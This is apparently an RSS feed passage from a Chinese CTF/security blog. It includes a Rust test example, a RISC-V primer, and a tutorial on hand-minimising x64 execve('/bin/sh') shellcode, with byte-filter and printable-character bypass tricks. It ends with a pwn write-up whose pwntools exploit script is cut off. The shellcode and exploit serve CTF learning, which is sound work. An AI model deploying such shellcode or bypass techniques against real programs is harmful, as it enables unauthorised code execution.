class="line">    <span class="keyword">use</span> super::*;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[test]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">player_reg</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">players</span> = register_player!(</span><br><span class="line">            <span class="string">&quot;Player 1&quot;</span> =&gt; <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;Player 2&quot;</span> =&gt; <span class="string">&#x27;O&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="comment">/* dbg!(players);</span></span><br><span class="line"><span class="comment">        assert!(false); */</span></span><br><span class="line">        <span class="built_in">assert_eq!</span>(</span><br><span class="line">            players,</span><br><span class="line">            <span class="built_in">vec!</span>[Player::<span class="title function_ invoke__">new</span>(<span class="string">&quot;Player 1&quot;</span>, <span class="string">&#x27;X&#x27;</span>), Player::<span class="title function_ invoke__">new</span>(<span class="string">&quot;Player 2&quot;</span>, <span class="string">&#x27;O&#x27;</span>)]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在你的终端运行 <code>cargo test</code></p><p>如果正常就只能看到ok，出错就会看到你的输出和错误信息。一般如果我们确定大概会有个什么输出，我们就用assert系列的宏，这很好理解。当我们想要比较的内容太多，你懒得输入，你可以主动报错<del>骗它输出</del>， 比如本人就喜欢 <code>assert!(false);</code>， 然后前面记得输出一下，然后你就可以看到回显了：D</p><blockquote><p>  测试函数可以有很多个，会挨个跑一遍</p><p>  super关键字代表当前模块（这里指test）的父模块，所以 <code>use super::*;</code>就是导入父模块的所有项。如果你的register_player等都定义在main.rs中，那么你应该把这段<code>mod test&#123; &#125;</code>放在main.rs中的某个位置（这保证了main是test的父模块）。</p></blockquote><h3 id="优化你的文件结构（todo）"><a href="#优化你的文件结构（todo）" class="headerlink" title="优化你的文件结构（todo）"></a>优化你的文件结构（todo）</h3>]]></content:encoded>
      
      
      
      
      <comments>http://hacbit.tech/Rust-QuickStart/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Shellcode编写入门</title>
      <link>http://hacbit.tech/Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8/</link>
      <guid>http://hacbit.tech/Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8/</guid>
      <pubDate>Thu, 14 Sep 2023 06:29:38 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;Shellcode编写入门&quot;&gt;&lt;a href=&quot;#Shellcode编写入门&quot; class=&quot;headerlink&quot; title=&quot;Shellcode编写入门&quot;&gt;&lt;/a&gt;Shellcode编写入门&lt;/h1&gt;&lt;h2 id=&quot;为什么要手写shellcode？&quot;&gt;&lt;a href=&quot;#为什么要手写shellcode？&quot; class=&quot;headerlink&quot; title=&quot;为什么要手写shellcode？&quot;&gt;&lt;/a&gt;为什么要手写shellcode？&lt;/h2&gt;&lt;p&gt;现在的题目对shellcode做了越来越多的限制，比如限制长度，限制特定字符等等。所以一些通用性的shellcode已经很难再起作用，针对某个二进制文件编写特异化shellcode势在必行。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="Shellcode编写入门"><a href="#Shellcode编写入门" class="headerlink" title="Shellcode编写入门"></a>Shellcode编写入门</h1><h2 id="为什么要手写shellcode？"><a href="#为什么要手写shellcode？" class="headerlink" title="为什么要手写shellcode？"></a>为什么要手写shellcode？</h2><p>现在的题目对shellcode做了越来越多的限制，比如限制长度，限制特定字符等等。所以一些通用性的shellcode已经很难再起作用，针对某个二进制文件编写特异化shellcode势在必行。</p><span id="more"></span><h2 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h2><p>当然也不可否认shellcode生成工具的便捷性。适当利用也可以辅助我们来编写适合的shellcode。<br>常用的当然是pwntools模块下的shellcraft，比如shellcraft.sh()来生成execve(‘&#x2F;bin&#x2F;sh’,0,0)的汇编代码，还有shellcraft.open(‘flag’,0), shellcode.cat(‘flag’)等等，可以非常方便的生成指定架构下的汇编，<strong>但是pwntools会考虑很多情况（毕竟要考虑通用性的），所以肯定会比较长，实际上是有很大改进空间的</strong>。本篇的目的不是让读者从0开始写shellcode（写的多了也差不多可以直接搓了），只要能改进生成工具生成的shellcode以符合条件就可以了。</p><h2 id="从简化工具生成的shellcode开始"><a href="#从简化工具生成的shellcode开始" class="headerlink" title="从简化工具生成的shellcode开始"></a>从简化工具生成的shellcode开始</h2><p><strong>本篇以execve(‘&#x2F;bin&#x2F;sh’,0,0)为例</strong></p><p>假定我们的架构是x64的<br>先用pwntools生成一段来看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcraft.sh()</span><br><span class="line">    /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">    /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">    /* push <span class="string">b&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">    xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">    xor esi, esi /* <span class="number">0</span> */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push <span class="number">8</span></span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* <span class="number">0</span> */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* <span class="number">0x3b</span> */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>发现前面<code>push 0x68</code>， 和<code>mov rax，0x732f2f2f6e69622f</code> ,<code>push rax</code> 是把&#x2F;bin&#x2F;&#x2F;&#x2F;sh\x00push到栈上，但是如果没有对&#x2F;bin&#x2F;sh字符串做检测的话可以直接传&#x2F;bin&#x2F;sh\x00, 或者&#x2F;bin&#x2F;&#x2F;sh，所以可以简化为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f</span><br></pre></td></tr></table></figure><p><code>mov rdi, rsp</code>是把指向&#x2F;bin&#x2F;sh字符串的指针传给rdi寄存器，（因为execve的第一个参数实际上需要的是字符串的地址），由于刚刚把&#x2F;bin&#x2F;sh字符串push到栈上（此时在栈顶，也就说rsp此时指向&#x2F;bin&#x2F;sh），所以可以通过mov rdi，rsp把&#x2F;bin&#x2F;sh地址传给rdi寄存器。</p><p>这里非要改的话可以改成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rsp</span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure><p>这样子编译后只有2个字节，原来的用mov传参有3个字节，改写的操作就是把rsp的值push到栈上，在pop到rdi，也能起到传参的效果</p><p><code> push 0x1010101 ^ 0x6873</code>    <code>xor dword ptr [rsp], 0x1010101</code></p><p>这两步应该是为了绕过潜在的sh字串检测，所以先传一个异或后的值，后面再异或回sh，</p><p>如果没有检测的话是可以直接<code>push 0x6873</code> <del><strong>（其实感觉这一大段都没什么用）</strong></del></p><p>后面的<code>xor esi, esi</code>是把rsi置零，使用esi，而不用rsi，是因为用esi编译的字节会少</p><p>然后push 8， pop rsi，就是相当于<code>mov rsi, 8</code>， 用push pop编译出来的更小</p><p><strong>但是直接push一个值到栈上要注意：</strong></p><blockquote><p>  push 只能push一个32位数，超过32位不能编译（起码用pwntools的asm是这样子）</p><p>  push 超过一个字节的数，会自动补全成32位，比如push 0x6873，就会编译为 hsh\x00\x00</p><p>  但是如果只是push一个字节，就会编译为2个字节，比如push 0x8，机器码为 j\x08</p></blockquote><p>后面这段没搞清楚目的是什么，如果只是为了把rsi和rdx置0的话，只需要2行xor就可以了</p><p>最后要给一个系统调用号给rax（x64架构execve调用号是0x3b）</p><p>最后syscall，完成调用！</p><p><del><strong>很好，你已经学会怎么搓shellcode了</strong></del></p><p><strong>完整的汇编码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f/* /bin/sh\x00 */</span><br><span class="line">push rax</span><br><span class="line">push rsp</span><br><span class="line">pop rdi/* rdi -&gt; /bin/sh */</span><br><span class="line">xor esi, esi/* rsi = 0 */</span><br><span class="line">xor edx, edx/* rdx = 0 */</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译成机器码看一看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x68732f6e69622f/* /bin/sh\x00 */</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi/* rdi -&gt; /bin/sh */</span></span><br><span class="line"><span class="string">xor esi, esi/* rsi = 0 */</span></span><br><span class="line"><span class="string">xor edx, edx/* rdx = 0 */</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;H\xb8/bin/s\x00\x00PT_1\xf61\xd2j;X\x0f\x05&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>只有0x16（22）个字节！！！</strong></p><p>再看看原来的shellcode的机器码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span>)</span><br><span class="line"><span class="number">48</span></span><br></pre></td></tr></table></figure><p>我们缩减了一半多的shellcode代码，并且执行相同的功能，这就是手搓汇编带来的（）</p><h2 id="OK，你已经学会手搓了，现在来实战吧"><a href="#OK，你已经学会手搓了，现在来实战吧" class="headerlink" title="OK，你已经学会手搓了，现在来实战吧"></a>OK，你已经学会手搓了，现在来实战吧</h2><h3 id="moectf-changeable-shellcode"><a href="#moectf-changeable-shellcode" class="headerlink" title="moectf changeable_shellcode"></a>moectf changeable_shellcode</h3><p><em><strong>附件：</strong></em> <a herf="../resources/pwn_asset/shellcodeBegin/changeable_shellcode" target="_block">changeable_shellcode</a></p><p>简单来说就是过滤了 <code>\x0f\x05</code> 然后shellcode长度不超过 0x28</p><p>一种思路是直接在后面通过异或之类的方法把syscall写在后面</p><p>可以先栈迁移到rwx段，当然为了避免对栈操作影响到原来写的shellcode，所以我这里就 add了 0x40</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push rdx</span><br><span class="line">pop rsp</span><br><span class="line">add rsp, 0x40</span><br></pre></td></tr></table></figure><p>然后就是正常构造 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f</span><br><span class="line">push rax# 把 /bin/sh\0 push到栈顶</span><br><span class="line">push rsp# 把 binsh字符串地址push到栈顶</span><br><span class="line">pop rdi</span><br><span class="line">xor esi, esi</span><br><span class="line">xor edx, edx</span><br><span class="line">xor eax, 0x6e696720 # 异或构造 \x0f\x05</span><br><span class="line">push rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">push rsp# 此时rsp指向 \x0f\x05 (syscall)</span><br><span class="line">ret# 把syscall地址push到栈顶就可以跳转过去getshell了</span><br></pre></td></tr></table></figure><p>这个shellcode就只需要 0x22 bytes完全够用</p><h2 id="一些特殊的要求的shellcode"><a href="#一些特殊的要求的shellcode" class="headerlink" title="一些特殊的要求的shellcode"></a>一些特殊的要求的shellcode</h2><h3 id="可见字符限制"><a href="#可见字符限制" class="headerlink" title="可见字符限制"></a>可见字符限制</h3><p>有时候会遇到shellcode只能使用可见字符的限制</p><ul><li>大部分寄存器的push pop都是可见的，而且除了r15，r14这类的，基本都是1一个字节，这对于某些限制长度的情况下特别好用</li><li>部分xor，sub， and等操作</li></ul><p>我这里简单列了个表（</p><blockquote><p>  reg 表示寄存器，后面的数字是位数，比如 reg8， 就是8位（也就是1字节）的寄存器，比如 al，ah寄存器，reg16如 ax，di寄存器</p><table><thead><tr><th>reg</th><th>include</th></tr></thead><tbody><tr><td>reg8</td><td>al, ah, bl, bh, cl, ch, dl, dh, spl, bpl, sil, dil, r8b, r9b, r10b, r11b, r12b, r13b, r14b, r15b</td></tr><tr><td>reg16</td><td>ax, bx, cx, dx, sp, bp, si, di, r8w, r9w, r10w, r11w, r12w, r13w, r14w, r15w</td></tr><tr><td>reg32</td><td>eax, ebx, ecx, edx, esp, ebp, esi, edi, r8d, r9d, r10d, r11d, r12d, r13d, r14d, r15d</td></tr><tr><td>reg64</td><td>rax, rbx, rcx, rdx, rsp, rbp, rsi, rdi, r8, r9, r10, r11, r12, r13, r14, r15</td></tr></tbody></table><p>  im 表示立即数，后面的数字也是代表位数， 比如 0x4141 就是 im16 （2字节立即数）</p><p>  mem 表示内存地址，后面的数字表示取从该地址开始的多少位，比如 mem8 表示取该地址开始的1字节，会与 [] 配合使用</p><p>  [xxx] 表示解引用，这和正常的intel asm语法差不多，比如 xor ax, [rbx]</p><p>  上面的例子中， [rbx] 就是一个 [mem16]， 是因为前面ax是16位所以能推导出 [rbx] 需要取2字节，当然也可以显示的通过 qword， dword， word， byte来指定取8&#x2F;4&#x2F;2&#x2F;1 字节</p></blockquote><h4 id="push-amp-pop"><a href="#push-amp-pop" class="headerlink" title="push &amp; pop"></a>push &amp; pop</h4><table><thead><tr><th>汇编</th><th>机器码</th><th>汇编</th><th>机器码</th></tr></thead><tbody><tr><td>pop rax</td><td>X</td><td>push rax</td><td>P</td></tr><tr><td>pop rcx</td><td>Y</td><td>push  rcx</td><td>Q</td></tr><tr><td>pop rdx</td><td>Z</td><td>push  rdx</td><td>R</td></tr><tr><td>pop rbx</td><td>[</td><td>push  rbx</td><td>S</td></tr><tr><td>pop rsp</td><td>\</td><td>push  rsp</td><td>T</td></tr><tr><td>pop rbp</td><td>]</td><td>push  rbp</td><td>U</td></tr><tr><td>pop rsi</td><td>^</td><td>push  rsi</td><td>V</td></tr><tr><td>pop rdi</td><td>_</td><td>push  rdi</td><td>W</td></tr><tr><td>pop r8</td><td>AX</td><td>push  r8</td><td>AP</td></tr><tr><td>pop r9</td><td>AY</td><td>push  r9</td><td>AQ</td></tr><tr><td>pop r10</td><td>AZ</td><td>push  r10</td><td>AR</td></tr><tr><td>pop r11</td><td>A[</td><td>push  r11</td><td>AS</td></tr><tr><td>pop r12</td><td>A\</td><td>push  r12</td><td>AT</td></tr><tr><td>pop r13</td><td>A]</td><td>push  r13</td><td>AU</td></tr><tr><td>pop r14</td><td>A^</td><td>push  r14</td><td>AV</td></tr><tr><td>pop r15</td><td>A_</td><td>push  r15</td><td>AW</td></tr></tbody></table><h4 id="xor-amp-add"><a href="#xor-amp-add" class="headerlink" title="xor &amp; add"></a>xor &amp; add</h4><ul><li><code>xor reg8, im8</code> , <code>xor reg16, im16</code> , <code>xor reg32/reg64, im32 </code>  （试了一下好像只有 rax 系列的才行？）</li><li><code>xor reg8/reg16/reg32/reg64, [mem8/mem16/mem32/mem64]</code> （如果要类似 rax + xxxx这样子的地址最好还是加1字节偏移吧，超过一个字节（如：[rax + 0x40404040] 就很难全是可见字符了）</li><li><code>sub reg8, im8</code></li></ul><p><strong>example：</strong></p><table><thead><tr><th>汇编</th><th>机器猫</th><th>汇编</th><th>机器猫</th></tr></thead><tbody><tr><td>xor rax, 0x41424344</td><td>H5DCBA</td><td>xor eax, 0x41424344</td><td>5DCBA</td></tr><tr><td>xor ax, 0x4141</td><td>f5AA</td><td>xor ax, 0x6161</td><td>f5aa</td></tr><tr><td>xor al, 0x41</td><td>4A</td><td>xor al, 0x61</td><td>4a</td></tr><tr><td>xor al, byte [rbx + 0x40]</td><td>2CA</td><td>xor bx, [rcx + 0x41]</td><td>f3YA</td></tr><tr><td>xor edi, [rax + 0x40]</td><td>3x@</td><td>xor rbx, [rbp + 0x40]</td><td>H3]@</td></tr><tr><td>sub rax, 0x41424344</td><td>H-DCBA</td><td>sub eax, 0x41424344</td><td>-DCBA</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><p><strong>todo</strong></p>]]></content:encoded>
      
      
      
      
      <comments>http://hacbit.tech/Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RISC-V入门</title>
      <link>http://hacbit.tech/RISC-V%E5%85%A5%E9%97%A8/</link>
      <guid>http://hacbit.tech/RISC-V%E5%85%A5%E9%97%A8/</guid>
      <pubDate>Sun, 03 Sep 2023 03:19:51 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;strong&gt;先写点简单的，后面看情况补充……&lt;/strong&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><strong>先写点简单的，后面看情况补充……</strong></p><span id="more"></span><h1 id="什么是RISC-V"><a href="#什么是RISC-V" class="headerlink" title="什么是RISC-V"></a>什么是RISC-V</h1><p>一般常见的处理器架构有x86和arm，x86主要在PC端，ARM主要用于移动终端。</p><p>但是arm有个问题是，设计arm架构芯片需要经过arm公司授权，同时会产生一些费用，但是，假如某天arm公司不授权怎么办？<br>riscv架构就是为了解决此问题，riscv最早起源于加州大学伯克利分校，由于受够了现有处理器架构的夫扎县和相关知识产权的限制，伯克利大学决定发明一种全新的、简单且开放免费的指令集架构。</p><p>从RISC-V名字可以看出，这是risc第5代指令集架构。而riscv目标是“成为一种完全开放的指令集架构，可被任何学术机构或商业组织自由使用“。</p><h1 id="RISC-V通用寄存器"><a href="#RISC-V通用寄存器" class="headerlink" title="RISC-V通用寄存器"></a>RISC-V通用寄存器</h1><table><thead><tr><th>寄存器</th><th>ABI名称</th><th>说明</th></tr></thead><tbody><tr><td>x0</td><td>zero</td><td>0值寄存器，硬编码为0，写入数据忽略，读取数据为0</td></tr><tr><td>x1</td><td>ra</td><td>用于返回地址（return address）</td></tr><tr><td>x2</td><td>sp</td><td>用于栈指针（stack pointer）</td></tr><tr><td>x3</td><td>gp</td><td>用于通用指针（global pointer）</td></tr><tr><td>x4</td><td>tp</td><td>用于线程指针</td></tr><tr><td>x5</td><td>t0</td><td>用于存放临时数据或者备用链接寄存器</td></tr><tr><td>x6~x7</td><td>t1~t2</td><td>用于存放临时数据寄存器</td></tr><tr><td>x8</td><td>s0&#x2F;fp</td><td>需要保存的寄存器或者帧指针寄存器</td></tr><tr><td>x9</td><td>s1</td><td>需要保存寄存器</td></tr><tr><td>x10~x11</td><td>a0~a1</td><td>函数参数或者返回值寄存器</td></tr><tr><td>x12~x17</td><td>a2-a7</td><td>函数传递参数寄存器</td></tr><tr><td>x18~x27</td><td>s2-s11</td><td>需要保存的寄存器</td></tr><tr><td>x28~x31</td><td>t3~t6</td><td>用于存放临时数据寄存器</td></tr></tbody></table><h1 id="常用指令浅析"><a href="#常用指令浅析" class="headerlink" title="常用指令浅析"></a>常用指令浅析</h1><p>一般来说要读懂大致的逻辑只需要常用的读写值，比较跳转这类就可以了，其他个别陌生的可以猜，或者临时去查（很多可以直接猜出来的）</p><ul><li>l（Load）系，l开头的基本就是取值，比如li a5, a4 就是把a4的值取到a5那里</li></ul><blockquote><p>  另外有个比较特殊的是lui，addi，这两个是对li的拓展，一般要传递一个数据（通常是地址）高20位用lui，低12位用addi</p><p>  比如：要传递0x11451419给a5寄存器，就会使用</p><p>  lui a5, 0x11451</p><p>  addi a5, a5, 0x419</p></blockquote><ul><li>s（store）系，s开头基本表示存值，比如sw a5, -14h(s0)，表示把a5寄存器的值写入s0偏移为-0x14的地址</li></ul><blockquote><p>  l和s有些时候要靠后面的字母来猜具体功能，</p><p>  比如如果是w结尾，想到word，那么sw（store word）就可以猜是写入一个word（2字节）</p><p>  同理还有lw（load word）等</p></blockquote><p><em>当然也不是所有s开头都是表示store，还有比如slli（shift left logical immediate 逻辑左移）</em></p><ul><li>j（jump）系，j开头基本就是跳转了，这里是无条件跳转</li></ul><blockquote><p>  有条件的跳转常常是b开头，比如bgtz a5, label_1 就是把a5寄存的值和0比较，a5为正就会跳转到label_1，为负就继续往下执行；</p><p>  bge a5, a4, label2，比较a5和a4，a5 &gt;&#x3D; a4 跳转到label2，反之继续执行</p></blockquote><p>其他的诸如：mv，call，add，ret这些指令，都比较熟悉，功能也大差不差。</p><h1 id="RISC-V实战"><a href="#RISC-V实战" class="headerlink" title="RISC-V实战"></a>RISC-V实战</h1>]]></content:encoded>
      
      
      
      
      <comments>http://hacbit.tech/RISC-V%E5%85%A5%E9%97%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2023-8下半月比赛wp</title>
      <link>http://hacbit.tech/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/</link>
      <guid>http://hacbit.tech/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/</guid>
      <pubDate>Mon, 28 Aug 2023 01:00:21 GMT</pubDate>
      
      <description>&lt;ul&gt;
&lt;li&gt;&lt;em&gt;NSSCTF-2nd（pwn方向全部，re两道）&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;WMCTF（待补充）&lt;/li&gt;
&lt;li&gt;&lt;em&gt;SEKAICTF（re一道）&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;也许还有……&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<ul><li><em>NSSCTF-2nd（pwn方向全部，re两道）</em></li><li>WMCTF（待补充）</li><li><em>SEKAICTF（re一道）</em></li><li><em>也许还有……</em></li></ul><span id="more"></span><h1 id="NSSCTF-2023"><a href="#NSSCTF-2023" class="headerlink" title="NSSCTF-2023"></a>NSSCTF-2023</h1><p>比赛中解出2道re和1道pwn，算是正常发挥了</p><p><em><strong>ls-pwn(finish)：</strong></em></p><ul><li><em>NewBottleOldWine</em></li><li><em>xenny的诱惑</em></li><li><em>happy2</em></li></ul><p><em><strong>ls-re：</strong></em></p><ul><li>MyBase</li><li>Bytecode</li></ul><h2 id="Pwn-NewBottleOldWine"><a href="#Pwn-NewBottleOldWine" class="headerlink" title="Pwn-NewBottleOldWine"></a>Pwn-NewBottleOldWine</h2><p><em><strong>附件：</strong></em><a href="../resources/pwn_asset/2023-8/newBottleOldWine" target="_block">newBottleOldWine</a></p><h3 id="在做题之前："><a href="#在做题之前：" class="headerlink" title="在做题之前："></a>在做题之前：</h3><p>文件是RISC-V架构的，临时学了一点risc-v的汇编：</p><p>做本题大概只需要知道如下几条：</p><ul><li>l（Load）系，l开头的基本就是取值，比如li a5, a4 就是把a4的值取到a5那里</li></ul><blockquote><p>  另外有个比较特殊的是lui，addi，这两个是对li的拓展，一般要传递一个数据（通常是地址）高20位用lui，低12位用addi</p><p>  比如：要传递0x11451419给a5寄存器，就会使用</p><p>  lui a5, 0x11451</p><p>  addi a5, a5, 0x419</p></blockquote><ul><li>s（store）系，s开头基本表示存值，比如sw a5, -14h(s0)，表示把a5寄存器的值写入s0偏移为-0x14的地址</li><li>j（jump）系，j开头基本就是跳转了，这里是无条件跳转</li></ul><blockquote><p>  有条件的跳转常常是b开头，比如bgtz a5, label_1 就是把a5寄存的值和0比较，a5为正就会跳转到label_1，为负就继续往下执行；</p><p>  bge a5, a4, label2，比较a5和a4，a5 &gt;&#x3D; a4 跳转到label2，反之继续执行</p></blockquote><p>其他的诸如：mv，call，add，ret这些指令，都比较熟悉，功能也大差不差。</p><h3 id="汇编码分析"><a href="#汇编码分析" class="headerlink" title="汇编码分析"></a>汇编码分析</h3><p>进去先找找有没有后门：</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/backdoor.png" alt="backdoor" style="zoom:67%;"><p>后门在0x1145162A的位置，可以看到这里用lui和addi传递了一个完整的字符串地址，然后call system，跟进去看这个字符串是&#x2F;bin&#x2F;sh</p><p>然后往上翻发现了两个主要函数：</p><p>一个具有栈溢出漏洞（所以把这个函数改名为了vuln）</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/vuln.png" alt="vuln" style="zoom: 67%;"><p>另一个应该就是主程序</p><p><em><strong>main前半段：</strong></em></p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/main_1.png" alt="main_1" style="zoom:67%;"><p>可以看到程序先读入了一个int64，并把值传进qword_11453058</p><p>然后在把qword_11453058的值传给a5寄存器，用sext.w指令把a5拓展</p><blockquote><p>  sext.w的作用是把32位拓展到64位，保留符号，比如-1，十六进制表示为0xffffffff， 拓展为64位就把高32位全部填充1（保证还是和32位符号一致），变成了0xffffffffffffffff； 如果是正数，就把高32位全部填充0；</p></blockquote><p>这里把a5拓展后再和0比较，小于就会继续往下执行到exit，所以这里<strong>a5必须要大于0</strong></p><p>然后如果大于0跳转后，重新从qword_11453058取值到a4寄存器，然后a5赋值为0x9F（159），然后a5， a4比较，如果a5&lt;a4，也就是a4&gt;&#x3D;160就会继续往下执行到exit。</p><p><em><strong>main后半段：</strong></em></p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/main_2.png" alt="main_2" style="zoom:67%;"><p>所以要保证&gt; 0 &amp;&amp; &lt; 160 才可以跳转到这里，这段逻辑很简单，就是取了qword_11453058的低16位（sw，只取word，也就是2字节），再加上start的地址（就是基地址0x11451400），然后跳转到这个地址。</p><p>一开始的思路是<strong>先跳转到read那里栈溢出到backdoor</strong></p><p>我们发现vuln离start最近，相差0xA0（160），刚好过不了验证。所以需要绕过检测，可以输入一个负数，保证低32位是正数即可。这样在第一步拓展时就是拓展为正数，绕过了第一个检测，然后第二个检测那里由于是负数<strong>（注意前面拓展时是把输入值取到了a5寄存器再对a5拓展，输入的值并没有变）</strong>自然可以绕过检测。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><p><strong>打完才想到可以直接从main跳转到后门那里，都不用栈溢出了</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">28299</span>)</span><br><span class="line"><span class="comment"># to_vuln_offset = -9223372036854775648</span></span><br><span class="line"><span class="comment"># 1000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 1010 0000</span></span><br><span class="line"><span class="comment"># 0x114514a0</span></span><br><span class="line"></span><br><span class="line">to_sh_offset = -<span class="number">9223372036854775254</span></span><br><span class="line"><span class="comment"># 1000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0010 0010 